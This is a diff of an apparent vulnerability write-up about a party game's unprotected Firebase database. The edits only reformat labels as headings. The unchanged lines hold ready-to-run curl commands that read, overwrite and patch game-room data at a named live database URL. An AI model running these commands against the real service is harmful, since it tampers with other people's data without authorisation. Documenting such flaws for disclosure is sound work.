@@ -35,11 +35,11 @@ This, in my opinion is the most dangerous vulnerability out of all of them. This
 
 #### How it works: 
      
-To read:
+##### To read:
      
 `curl 'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/ROOM_CODE.json' | jq`    
 
-To write: 
+##### To write: 
      
 `curl -i -X PUT \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE_OR_CUSTOM_DB].json' \
@@ -48,9 +48,9 @@ To write:
 
 
       
-OR(change the word to something custom example): 
-     
-    `curl -i -X PATCH \
+##### OR(change the word to something custom example): 
+    
+`curl -i -X PATCH \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json' \
   -H 'Content-Type: application/json' \
   --data '{"word":"ImDaBest"}'`
